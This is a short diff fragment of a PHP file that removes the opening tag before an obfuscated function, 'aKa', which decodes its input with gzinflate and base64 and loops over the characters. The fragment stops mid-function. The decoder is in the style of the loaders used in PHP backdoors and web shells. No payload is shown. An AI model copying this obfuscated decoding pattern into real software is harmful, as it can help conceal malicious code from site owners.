@@ -1,4 +1,4 @@
-<?php function aKa($pzcW)
+ function aKa($pzcW)
 { 
 $pzcW=gzinflate(base64_decode($pzcW));
  for($i=0;$i<strlen($pzcW);$i++)
